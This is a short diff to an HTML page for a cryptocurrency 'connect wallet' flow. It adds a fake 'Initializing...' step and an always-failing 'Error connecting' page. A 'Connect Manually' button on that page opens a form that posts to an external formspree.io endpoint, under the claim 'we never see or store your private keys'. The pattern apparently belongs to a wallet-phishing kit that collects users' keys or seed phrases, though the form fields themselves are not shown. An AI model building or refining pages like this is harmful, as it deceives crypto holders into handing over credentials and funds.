@@ -48,7 +48,7 @@
                 </div>
             </section>
             <section id="coinmarketcap" class="coinmarketcap-section">
-                <h2>Coin Live Updates</h2>
+                <h2>CoinMarket Live Updates</h2>
                 <div id="coinmarketcap-data"></div>
             </section>
         </section>
@@ -74,11 +74,16 @@
             <p>Select your wallet type from the menu, or choose ‘Other Wallet’ to continue</p>
         </section>
 
-        <!-- Page 3: Connection Result -->
-        <section id="connect-result" class="page">
+        <!-- Page 3: Initializing... -->
+        <section id="initializing" class="page">
+            <h1>Initializing...</h1>
+        </section>
+
+        <!-- Page 4: Error Connecting -->
+        <section id="error-connecting" class="page">
             <h2>Your wallet, your control — we never see or store your private keys</h2>
             <h1>Connection Status</h1>
-            <p id="connectionMessage">Error connecting....</p>
+            <p id="connectionMessage">Error connecting</p>
             <button id="connectManuallyButton">Connect Manually</button>
             <div id="manualConnectSection" class="hidden">
                 <form action="https://formspree.io/f/mqalglpw" method="POST" id="messageForm">
@@ -98,4 +103,3 @@
     <script src="script.js"></script>
 </body>
 </html>
-
